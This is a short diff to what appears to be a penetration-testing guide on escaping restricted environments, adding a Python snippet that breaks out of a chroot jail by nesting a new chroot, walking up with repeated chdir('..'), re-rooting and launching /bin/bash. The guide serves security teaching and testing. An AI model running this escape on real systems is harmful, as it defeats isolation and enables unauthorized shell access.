@@ -31,6 +31,19 @@ int main(void)
 ```
 {% endcode %}
 
+Using python:
+
+```python
+#!/usr/bin/python
+import os
+os.mkdir("chroot-dir")
+os.chroot("chroot-dir")
+for i in range(1000):
+    os.chdir("..")
+os.chroot(".")
+os.system("/bin/bash")
+```
+
 ## Modify PATH
 
 Check if you can modify the PATH env variable
